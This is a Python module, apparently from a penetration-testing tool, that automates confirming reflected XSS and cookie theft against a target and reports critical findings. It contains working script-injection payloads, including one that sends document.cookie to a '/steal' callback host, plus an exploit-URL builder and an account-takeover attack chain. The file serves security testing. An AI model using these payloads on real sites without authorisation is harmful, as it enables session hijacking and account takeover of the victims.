"""XSS Proof runner — combines reflected XSS + cookie theft into a CRITICAL finding.

When xss-extended confirms reflected XSS in a URL parameter, and session-security
confirms the session cookie has no HttpOnly flag, this runner proves the attack:
1. Fetches the target to collect the real session cookie
2. Verifies the cookie has no HttpOnly flag (stealable via JS)
3. Builds the exploit URL with a cookie-exfiltration payload
4. Confirms the payload is reflected unencoded in the response
5. Returns a CRITICAL finding with the full exploit chain
"""
from __future__ import annotations

import json
from hashlib import sha256
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx as httpx_client

from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

XSS_PROOF_RESULTS_ARTIFACT_NAME = "xss-proof-results.json"

# Payload that exfiltrates cookies — uses a callback URL we control
COOKIE_THEFT_PAYLOAD = "<script>document.location='https://proof.aegispt.local/steal?c='+encodeURIComponent(document.cookie)</script>"
# Simpler payload to confirm execution context (no external call needed)
CONFIRM_PAYLOAD = "<script>document.write('AEGISPT_XSS_CONFIRMED_'+document.cookie)</script>"
MARKER = "AEGISPT_XSS_CONFIRMED_"


def _artifact(name: str, data: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(data, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    replaced = [(k, payload if k == param else v) for k, v in params]
    if not any(k == param for k, _ in params):
        replaced.append((param, payload))
    new_query = urlencode(replaced)
    return urlunparse(parsed._replace(query=new_query))


def execute_xss_proof(
    targets: list[str],
    *,
    xss_findings: list[dict[str, Any]] | None = None,
    timeout_seconds: float = 15.0,
) -> RunnerExecution:
    """Prove XSS exploitability by combining XSS sink with cookie theft.

    xss_findings: list of dicts from xss-extended with keys:
        - target: vulnerable URL (without payload)
        - tested_params: list of parameter names that reflect the payload
        - summary: description
    """
    if not targets:
        raise ValueError("at least one target is required")

    base_target = normalize_http_target(targets[0])
    findings: list[dict[str, Any]] = []
    checks: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with httpx_client.Client(follow_redirects=True, timeout=timeout_seconds) as client:
        # Step 1: fetch target to get session cookie
        try:
            baseline = client.get(base_target)
        except httpx_client.HTTPError as exc:
            return RunnerExecution(
                tool="xss-proof",
                exit_code=1,
                stdout="",
                stderr=f"Cannot reach target: {exc}",
                metadata={"status": "failed"},
                artifacts=[],
            )

        session_cookies = {
            name: {"value": value, "httponly": False}
            for name, value in baseline.cookies.items()
        }
        # Check Set-Cookie headers for HttpOnly flag
        for header in baseline.headers.get_list("set-cookie") if hasattr(baseline.headers, "get_list") else [baseline.headers.get("set-cookie", "")]:
            if not header:
                continue
            parts = [p.strip().lower() for p in header.split(";")]
            cookie_part = header.split(";")[0]
            if "=" in cookie_part:
                cname = cookie_part.split("=")[0].strip()
                if cname in session_cookies:
                    session_cookies[cname]["httponly"] = "httponly" in parts

        stealable_cookies = [name for name, info in session_cookies.items() if not info["httponly"]]

        # Step 2: try each XSS finding to confirm cookie theft
        xss_to_test: list[tuple[str, list[str]]] = []

        if xss_findings:
            for f in xss_findings:
                vuln_url = str(f.get("target") or f.get("url") or base_target)
                params = list(f.get("tested_params") or f.get("params") or [])
                if vuln_url and params:
                    xss_to_test.append((vuln_url, params))

        # Fallback: test common parameters on base target
        if not xss_to_test:
            xss_to_test = [(base_target, ["uid", "q", "search", "name", "input", "id"])]

        for vuln_url, params in xss_to_test:
            for param in params:
                # Inject confirmation payload
                injected = _inject_param(vuln_url, param, CONFIRM_PAYLOAD)
                try:
                    response = client.get(injected)
                except httpx_client.HTTPError as exc:
                    stderr_lines.append(f"XSS proof check failed for {injected}: {exc}")
                    continue

                body = response.text or ""
                confirmed = MARKER in body
                cookie_name_in_output = any(
                    name in body[body.find(MARKER):body.find(MARKER) + 200]
                    for name in session_cookies
                ) if confirmed else False

                check = {
                    "target": vuln_url,
                    "param": param,
                    "injected_url": str(injected)[:500],
                    "status_code": response.status_code,
                    "payload_confirmed": confirmed,
                    "cookie_in_output": cookie_name_in_output,
                    "stealable_cookies": stealable_cookies,
                    "response_excerpt": body[:300],
                }
                checks.append(check)

                if confirmed and stealable_cookies:
                    # Full exploit URL for the report
                    exploit_url = _inject_param(vuln_url, param, COOKIE_THEFT_PAYLOAD)
                    findings.append({
                        "type": "xss_cookie_theft_confirmed",
                        "title": f"Session Cookie Theft via XSS — Confirmed Exploitable ({param})",
                        "severity": "critical",
                        "target": vuln_url,
                        "summary": (
                            f"Reflected XSS in parameter '{param}' confirmed executable in browser context. "
                            f"Session cookie(s) {stealable_cookies} have no HttpOnly flag and are accessible "
                            f"via document.cookie. An attacker who tricks a victim into clicking the exploit "
                            f"URL will receive the victim's session token, enabling account takeover."
                        ),
                        "evidence": {
                            **check,
                            "exploit_url": exploit_url,
                            "attack_description": (
                                f"1. Victim receives link: {str(exploit_url)[:200]}\n"
                                f"2. Browser executes <script> — document.cookie accessible (no HttpOnly)\n"
                                f"3. Cookie '{stealable_cookies[0] if stealable_cookies else '?'}' sent to attacker\n"
                                f"4. Attacker uses cookie to impersonate victim"
                            ),
                        },
                    })
                elif confirmed:
                    findings.append({
                        "type": "xss_confirmed_no_stealable_cookie",
                        "title": f"Reflected XSS Confirmed in Browser Context ({param})",
                        "severity": "high",
                        "target": vuln_url,
                        "summary": (
                            f"XSS payload executed in browser context for parameter '{param}'. "
                            f"Session cookies appear to have HttpOnly protection, limiting direct theft. "
                            f"Other attack vectors (phishing, UI redress) remain possible."
                        ),
                        "evidence": check,
                    })

    result_payload = {
        "tool": "xss-proof",
        "targets": [base_target],
        "checks": checks,
        "findings": findings,
        "summary": {
            "finding_count": len(findings),
            "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
            "stealable_cookies_found": bool(stealable_cookies),
            "stealable_cookie_names": stealable_cookies,
        },
    }

    return RunnerExecution(
        tool="xss-proof",
        exit_code=exit_code,
        stdout=json.dumps(result_payload),
        stderr="\n".join(stderr_lines),
        metadata={"status": "ok" if not stderr_lines else "completed_with_warnings", "tool_version": "xss-proof:v1"},
        artifacts=[_artifact(XSS_PROOF_RESULTS_ARTIFACT_NAME, result_payload)],
    )
